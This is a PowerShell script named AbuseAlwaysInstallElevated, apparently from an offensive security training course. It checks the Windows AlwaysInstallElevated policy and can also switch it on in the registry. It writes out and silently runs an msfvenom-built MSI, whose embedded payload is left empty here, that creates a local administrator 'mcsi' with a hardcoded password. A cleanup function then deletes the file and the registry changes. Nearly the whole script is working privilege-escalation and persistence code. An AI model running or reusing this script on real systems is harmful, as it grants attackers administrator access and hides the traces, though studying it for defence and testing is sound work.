<# 
To install a package with elevated (system) privileges, set the AlwaysInstallElevated value to "1" under both of the following registry keys:

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

If the AlwaysInstallElevated value is not set to "1" under both of the preceding registry keys, the installer uses elevated privileges to install managed 
applications and uses the current user's privilege level for unmanaged applications.
#>

# Get-RegistryAlwaysInstallElevated
# Returns $True if any of the AlwaysInstallElevated registry keys are set.

$HKLM = 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer'
$HKCU = 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer'
$FileName = 'c:\\Windows\\Tasks\\PrivEsc.msi'

function Get-RegistryAlwaysInstallElevated {
	
    if (Test-Path $HKLM) {

        $HKLMval = (Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path $HKCU -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Host '[+] AlwaysInstallElevated - HKCU .. ENABLED!'
                return $True
            }
            else{
				
				Write-Host '[X] AlwaysInstallElevated - HKLM .. ENABLED'
                Write-Host '[X] AlwaysInstallElevated - HKCU .. NOT ENABLED'
            }
        }
        else{
            Write-Host '[X] AlwaysInstallElevated - HKLM .. NOT ENABLED'
        }
    }
	
    else{
        Write-Host '[X] $HKLM does not exist'
    }
	return $False
}

#Creates a new Local Administrator user 'mcsi' via MSI installer. Drops MSI installer to C:\Windows\Tasks folder > Executes
function AddUserMSI {

	# msfvenom -p windows/adduser USER=mcsi PASS=MCsi@12345 -f msi -o privesc.msi
	$b64encbinary = ''
	
	try {
        [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($b64encbinary))
        Write-Output "[+] MSI written to disk:  '$FileName' ... Executing.."

    }
    catch {
        Write-Warning "Error while writing to '$FileName'"
    }
	
	try {
        
		&'C:\Windows\System32\msiexec.exe' /quiet  /qn  /i "$FileName"
		Write-Output "[+] New Local Administrator added -  mcsi :: MCsi@12345 "

    }
    catch {
        Write-Warning "[X] Error occured while executing the MSI"
    }
}


function EnablePolicy {
	
	$bool = Get-RegistryAlwaysInstallElevated
	
	if($bool -eq $False)
	{		
		if ("Test-Path $HKLM -eq $False") {
			New-Item -Path $HKLM -Force
		}
				
		if ("Test-Path $HKCU -eq $False") {
			New-Item -Path $HKCU -Force
		}
		
		New-ItemProperty -Path $HKLM -Name AlwaysInstallElevated -Type "DWORD" -Value 1 -Force 
		New-ItemProperty -Path $HKCU -Name AlwaysInstallElevated -Type "DWORD" -Value 1 -Force 
		
		Write-Output "[+] Enabled AlwaysInstallElevated Policy"

	}
	
	else {
		
		Write-Output "[+] AlwaysInstallElevated Policy is already enabled"
		
	}
}

function CleanUp {
	

	Remove-Item "$FileName"
	Write-Output "[+] MSI cleaned up from disk"
	
	$bool = Get-RegistryAlwaysInstallElevated
	
	if($bool -eq $True)
	{
		Remove-ItemProperty -Path $HKCU -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
		Remove-Item -Path $HKCU -Force
		Remove-ItemProperty -Path $HKLM -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
		
		Write-Output "[+] Disabled AlwaysInstallElevated Policy"

	}
	
	else {
		
		Write-Output "[X] AlwaysInstallElevated Policy is not enabled"
	
	}

}

function Menu {

	Write-Host "`n[ ----- ]   AbuseAlwaysInstallElevated     [ ----- ]`n"
	Write-Host "`n [ - ] Get-RegistryAlwaysInstallElevated"
	Write-Host "`n [ - ] EnablePolicy"
	Write-Host "`n [ - ] AddUserMSI"
	Write-Host "`n [ - ] CleanUp`n`n"
}
